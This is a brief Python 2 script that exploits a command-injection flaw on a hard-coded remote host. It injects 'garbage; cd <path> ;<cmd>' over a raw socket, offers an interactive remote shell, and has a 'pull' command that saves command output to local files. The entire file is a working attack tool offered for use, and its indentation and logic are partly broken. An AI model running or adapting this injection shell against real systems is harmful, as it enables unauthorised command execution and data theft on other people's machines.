import socket
import sys
import time

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

# This method executes command line arguments
def execute_cmd(currPath, cmd, innerShell):

	# Creating a socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

	if innerShell == 0:
		s.recv(1024)
		s.send("garbage; cd " + currPath + " ;" + cmd + "\n")
		time.sleep(3)
		data = s.recv(1024)
		print(data)
		#result = data[779: ]
		#print(result)

	elif (cmd == "help"):
		print "shell Drop into an interactive shell and allow users to gracefully exit\npull <remote-path> <local-path> Download files\nhelp Shows this help menu\nquit Quit the shell"

	elif "pull" in cmd:
		pullCmds = str.split(cmd)           
		f = open(pullCmds[2], "w+")

		s.recv(1024)
		s.send("garbage; cd " + currPath + " ;" + pullCmds[1] + "\n")
		time.sleep(3)
		data = s.recv(1024)
		f.write(data)

 	s.close
		

if __name__ == '__main__':

    outerShell = True;
    
    while (outerShell == True):

       cmd = raw_input(">")
       currPath = "/"

       if cmd in ("help","pull"):
	  execute_cmd(currPath, cmd, -1)

       elif cmd == "quit":
	  exit()
          s.close()

       elif (cmd == "shell"):

	 innerShell = True
	 currPath = "/"

         while (innerShell != False):

           cmd = raw_input(currPath + ">")

           if cmd == "exit":
              innerShell = False
		
           elif "cd" in cmd: 
 		currPath = cmd[3: ] 

		if currPath == "":
		   currPath = "/"

           else:
              execute_cmd(currPath, cmd, 0)











